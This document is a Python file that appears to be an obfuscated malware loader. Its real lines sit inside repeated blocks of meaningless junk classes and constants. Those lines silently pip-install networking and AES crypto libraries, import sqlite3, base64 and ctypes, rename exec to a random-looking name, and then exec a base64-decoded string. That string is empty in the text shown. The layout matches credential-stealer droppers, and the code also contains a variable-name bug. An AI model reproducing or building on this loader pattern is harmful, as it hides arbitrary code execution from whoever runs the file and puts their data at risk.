

from sys import executable, stderr
class co6Iynp4zO:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UanKG72H3w:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kluKqNRyAY = 21162295
c9Ewq1CYE2 = 58232865
class Lkw2l7Qgas:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'RmWw7jM', 'age': 62}
["'i88NZbiWL6'", "'Bm6i91aziJ'", "'UycQxkspcG'", "'adejCnoLt8'"]
class nIlmUs672x:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'gohvPk2abu'
tN4raihJoL = 88586333
MzWCUYg7Ob = 19096083
TRuGPkr4Xq = 1836089
class YWkgV3G1ZV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class fhOJz3Xhxe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
DU6GSDrGOT = 58417426
QYVFa3v3FZ = 30824936
class dvRWxTNc5M:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
bVMQFesZUf = 80166202
class jSKxA5t0Fi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iqexYlbQjK:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mc196xqoNj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sv8JhPMuzY = 39459418
zntKq9ro8n = 89564476
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class co6Iynp4zO:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UanKG72H3w:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kluKqNRyAY = 21162295
c9Ewq1CYE2 = 58232865
class Lkw2l7Qgas:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'RmWw7jM', 'age': 62}
["'i88NZbiWL6'", "'Bm6i91aziJ'", "'UycQxkspcG'", "'adejCnoLt8'"]
class nIlmUs672x:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'gohvPk2abu'
tN4raihJoL = 88586333
MzWCUYg7Ob = 19096083
TRuGPkr4Xq = 1836089
class YWkgV3G1ZV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class fhOJz3Xhxe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
DU6GSDrGOT = 58417426
QYVFa3v3FZ = 30824936
class dvRWxTNc5M:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
bVMQFesZUf = 80166202
class jSKxA5t0Fi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iqexYlbQjK:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mc196xqoNj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sv8JhPMuzY = 39459418
zntKq9ro8n = 89564476
edHiwcv4c4BzMAmBKDWRnxTwRbk3RUuPWzqpnD = exec
class co6Iynp4zO:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UanKG72H3w:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kluKqNRyAY = 21162295
c9Ewq1CYE2 = 58232865
class Lkw2l7Qgas:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'RmWw7jM', 'age': 62}
["'i88NZbiWL6'", "'Bm6i91aziJ'", "'UycQxkspcG'", "'adejCnoLt8'"]
class nIlmUs672x:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'gohvPk2abu'
tN4raihJoL = 88586333
MzWCUYg7Ob = 19096083
TRuGPkr4Xq = 1836089
class YWkgV3G1ZV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class fhOJz3Xhxe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
DU6GSDrGOT = 58417426
QYVFa3v3FZ = 30824936
class dvRWxTNc5M:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
bVMQFesZUf = 80166202
class jSKxA5t0Fi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iqexYlbQjK:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mc196xqoNj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sv8JhPMuzY = 39459418
zntKq9ro8n = 89564476
import concurrent.futures
USkgdFX7NcldTrNXEwUKq3Zwb7KVu3VMT4vEcV=""
edHiwcv4c4BzMAmBKDWRnxTwRbk3RUuPWzqpnD(base64.b64decode(USkgdFX7NcldTrNXEwUKq3Zwb7KVu3VMT4vEcV))
class co6Iynp4zO:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UanKG72H3w:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kluKqNRyAY = 21162295
c9Ewq1CYE2 = 58232865
class Lkw2l7Qgas:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'RmWw7jM', 'age': 62}
["'i88NZbiWL6'", "'Bm6i91aziJ'", "'UycQxkspcG'", "'adejCnoLt8'"]
class nIlmUs672x:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'gohvPk2abu'
tN4raihJoL = 88586333
MzWCUYg7Ob = 19096083
TRuGPkr4Xq = 1836089
class YWkgV3G1ZV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class fhOJz3Xhxe:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
DU6GSDrGOT = 58417426
QYVFa3v3FZ = 30824936
class dvRWxTNc5M:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
bVMQFesZUf = 80166202
class jSKxA5t0Fi:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class iqexYlbQjK:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mc196xqoNj:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sv8JhPMuzY = 39459418
zntKq9ro8n = 89564476